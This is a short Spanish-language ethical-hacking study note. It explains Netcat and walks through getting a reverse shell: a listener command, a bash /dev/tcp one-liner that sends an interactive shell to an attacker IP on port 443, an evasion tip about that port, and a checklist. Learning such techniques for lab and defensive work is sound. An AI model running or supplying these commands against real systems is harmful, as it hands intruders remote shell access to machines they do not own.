> [!info] Idea principal
> Para usar una **reverse shell** con Netcat necesito conocer dos datos importantes:
> - La IP de mi maquina atacante.
> - La IP o acceso a la maquina victima.

## Que es Netcat

**Netcat** es una herramienta que permite abrir conexiones TCP/UDP entre maquinas. En hacking etico se usa mucho para:

- Escuchar conexiones entrantes.
- Conectarse a puertos remotos.
- Enviar o recibir datos.
- Obtener una shell reversa en laboratorios controlados.

## Reverse Shell con Netcat

Una **reverse shell** ocurre cuando la maquina victima se conecta hacia la maquina atacante, dandome una terminal remota.

> [!warning] Importante
> Esto debe usarse solo en maquinas propias, laboratorios o entornos donde tengas permiso.

## Paso 1: Preparar la Maquina Atacante

En la maquina atacante debo ponerme en escucha con Netcat:

```bash
sudo nc -nlvp 443
```

### Explicacion del comando

- `sudo`: ejecuta el comando con privilegios elevados.
- `nc`: ejecuta Netcat.
- `-n`: evita resolucion DNS.
- `-l`: modo escucha.
- `-v`: modo verbose, muestra mas informacion.
- `-p 443`: puerto donde escuchara la maquina atacante.

> [!tip] Puerto recomendado
> El puerto `443` suele usarse porque normalmente esta asociado a HTTPS y puede pasar mas desapercibido en algunos entornos de laboratorio.

## Paso 2: Ejecutar la Reverse Shell en la Victima

En la maquina victima se podria ejecutar una reverse shell como esta:

```bash
sh -i >& /dev/tcp/10.10.10.10/443 0>&1
```

Donde:

- `10.10.10.10` es la IP de la maquina atacante.
- `443` es el puerto donde Netcat esta escuchando.
- `sh -i` abre una shell interactiva.

> [!example] Flujo resumido
> 1. Atacante escucha en un puerto.
> 2. Victima ejecuta la reverse shell.
> 3. La conexion llega al Netcat del atacante.
> 4. El atacante obtiene una shell remota.

## Checklist Rapido

- [ ] Saber la IP de la maquina atacante.
- [ ] Elegir un puerto para escuchar.
- [ ] Levantar Netcat en la maquina atacante.
- [ ] Generar o copiar la reverse shell.
- [ ] Ejecutarla en la maquina victima.
- [ ] Comprobar si llega la conexion.
